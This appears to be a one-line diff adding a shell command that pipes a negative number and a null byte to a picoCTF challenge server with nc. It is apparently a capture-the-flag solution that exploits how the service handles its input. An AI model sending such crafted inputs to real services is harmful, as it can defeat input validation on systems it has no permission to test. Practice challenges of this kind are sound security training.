@@ -1,0 +1,1 @@
+{ echo "-5144"; printf "\x00";} | nc mercury.picoctf.net 8054
